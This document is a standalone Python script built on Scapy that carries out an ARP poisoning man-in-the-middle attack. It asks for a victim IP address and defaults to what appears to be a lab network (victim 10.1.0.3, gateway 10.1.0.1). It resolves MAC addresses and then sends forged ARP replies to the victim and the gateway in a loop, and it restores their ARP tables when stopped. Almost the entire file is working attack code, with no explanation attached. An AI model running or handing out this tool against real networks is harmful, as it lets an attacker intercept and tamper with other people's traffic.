#!/usr/bin/env python3

import time
import sys
import logging
import re
from scapy.all import Ether, ARP, srp, sendp, conf, get_if_list

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

DEFAULT_VICTIM_IP = "10.1.0.3"  # Default victim IP (ws3 for example)
GATEWAY_IP = "10.1.0.1"         # IP address of gateway (r1)
SEND_INTERVAL = 2               # Delay between ARP packets

def is_valid_ipv4(ip):
    """Check if string is valid IPv4 address"""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    
    # checks each octet is between 0 and 255
    octets = ip.split('.')
    for octet in octets:
        if not 0 <= int(octet) <= 255:
            return False
    
    return True

def get_valid_interface():
    """Find a valid interface to use for the attack"""
    interfaces = get_if_list()
    valid_interfaces = [iface for iface in interfaces if not iface.startswith('lo')]
    
    print(f"[*] Available interfaces: {valid_interfaces}")
    
    if not valid_interfaces:
        return None
    
    eth_interfaces = [iface for iface in valid_interfaces if 'eth' in iface]
    if eth_interfaces:
        return eth_interfaces[0]
    
    return valid_interfaces[0]

def get_mac(ip_address, iface):
    """Get MAC address for an IP using ARP request"""
    print(f"[*] Resolving MAC address for {ip_address}...")
    
    # First try: Scapy ARP request
    try:
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
        result = srp(arp_request, timeout=3, iface=iface, verbose=0)[0]
        
        if result:
            return result[0][1].hwsrc
    except Exception as e:
        print(f"[!] Scapy ARP request failed: {e}")
    
    # Second try: Use system commands
    try:
        import subprocess
        # Ping the host to populate ARP table
        print(f"[*] Trying ping method for {ip_address}...")
        subprocess.call(f"ping -c 3 -W 1 {ip_address} > /dev/null 2>&1", shell=True)
        # Get the arp cache entry
        result = subprocess.check_output(f"arp -n {ip_address}", shell=True).decode()
        
        mac_match = re.search(r'([0-9a-f]{2}(?::[0-9a-f]{2}){5})', result, re.IGNORECASE)
        if mac_match:
            return mac_match.group(1)
    except Exception as e:
        print(f"[!] System command method failed: {e}")
    
    return None

def get_attacker_mac(iface):
    """Get our own MAC address"""
    try:
        from scapy.all import get_if_hwaddr
        return get_if_hwaddr(iface)
    except Exception as e:
        print(f"[!] Error getting attacker MAC with Scapy: {e}")
        try:
            import subprocess
            result = subprocess.check_output(f"ip link show {iface}", shell=True).decode()
            mac_match = re.search(r'link/ether ([0-9a-f:]+)', result)
            if mac_match:
                return mac_match.group(1)
        except Exception as e:
            print(f"[!] Error getting MAC with system command: {e}")
    
    return None

def prompt_victim_ip():
    victim_ip = input(f"[?] Enter victim IP address [default: {DEFAULT_VICTIM_IP}]: ").strip()
    
    if not victim_ip:
        print(f"[*] Using default victim IP: {DEFAULT_VICTIM_IP}")
        return DEFAULT_VICTIM_IP
    
    if is_valid_ipv4(victim_ip):
        print(f"[*] Using victim IP: {victim_ip}")
        return victim_ip
    else:
        print(f"[!] Invalid IPv4 address. Using default: {DEFAULT_VICTIM_IP}")
        return DEFAULT_VICTIM_IP

print("[*] Starting ARP Poisoning attack...")

# get user input for victim ip addr
VICTIM_IP = prompt_victim_ip()

# Set up interface
interface = get_valid_interface()
if not interface:
    print("[!] No valid interface found. Exiting.")
    sys.exit(1)

print(f"[*] Using interface: {interface}")
print(f"[*] Target: {VICTIM_IP}")
print(f"[*] Impersonating Gateway: {GATEWAY_IP}")

# Get attacker MAC address
attacker_mac = get_attacker_mac(interface)
if not attacker_mac:
    print("[!] Failed to get attacker MAC address. Exiting.")
    sys.exit(1)
print(f"[*] Attacker MAC: {attacker_mac}")

# Attempt to get victim MAC
victim_mac = get_mac(VICTIM_IP, interface)
if not victim_mac:
    print("[!] Could not resolve victim MAC. Using broadcast.")
    victim_mac = "ff:ff:ff:ff:ff:ff"
else:
    print(f"[*] Found Victim MAC: {victim_mac}")

# Try to get gateway MAC
gateway_mac = get_mac(GATEWAY_IP, interface)
if not gateway_mac:
    print("[!] Could not resolve gateway MAC. Using broadcast.")
    gateway_mac = "ff:ff:ff:ff:ff:ff"
else:
    print(f"[*] Found Gateway MAC: {gateway_mac}")

# Main loop
try:
    packet_count = 0
    print("[*] Starting ARP poison loop. Press CTRL+C to stop...")
    
    while True:
        # Poison the victim (tell victim we are the gateway)
        victim_packet = Ether(dst=victim_mac)/ARP(
            op=2,                  # op=2 for ARP reply
            pdst=VICTIM_IP,
            hwdst=victim_mac,
            psrc=GATEWAY_IP,       # pretend to be the gateway
            hwsrc=attacker_mac     # our MAC
        )
        
        # Poison the gateway (tell gateway we are the victim)
        gateway_packet = Ether(dst=gateway_mac)/ARP(
            op=2,                  # op=2 for ARP reply
            pdst=GATEWAY_IP,
            hwdst=gateway_mac,
            psrc=VICTIM_IP,        # pretend to be the victim
            hwsrc=attacker_mac     # our MAC
        )
        
        sendp(victim_packet, iface=interface, verbose=0)
        sendp(gateway_packet, iface=interface, verbose=0)
        
        packet_count += 2
        if packet_count % 10 == 0:
            print(f"[*] Sent {packet_count} ARP poison packets...")
        
        time.sleep(SEND_INTERVAL)

except KeyboardInterrupt:
    print("\n[*] Stopping ARP Poisoning attack.")
    
    # Try to restore ARP tables when interrupted
    if victim_mac != "ff:ff:ff:ff:ff:ff" and gateway_mac != "ff:ff:ff:ff:ff:ff":
        print("[*] Restoring ARP tables...")
        for _ in range(5):
            # Tell victim that gateway has its real MAC
            restore_victim = Ether(dst=victim_mac)/ARP(
                op=2,
                pdst=VICTIM_IP,
                hwdst=victim_mac,
                psrc=GATEWAY_IP,
                hwsrc=gateway_mac
            )
            # Tell gateway that victim has its real MAC
            restore_gateway = Ether(dst=gateway_mac)/ARP(
                op=2,
                pdst=GATEWAY_IP,
                hwdst=gateway_mac,
                psrc=VICTIM_IP,
                hwsrc=victim_mac
            )
            
            sendp(restore_victim, iface=interface, verbose=0)
            sendp(restore_gateway, iface=interface, verbose=0)
            time.sleep(0.2)
        print("[*] ARP tables restored.")
    
    sys.exit(0)
except Exception as e:
    print(f"\n[!] An error occurred: {e}")
    sys.exit(1)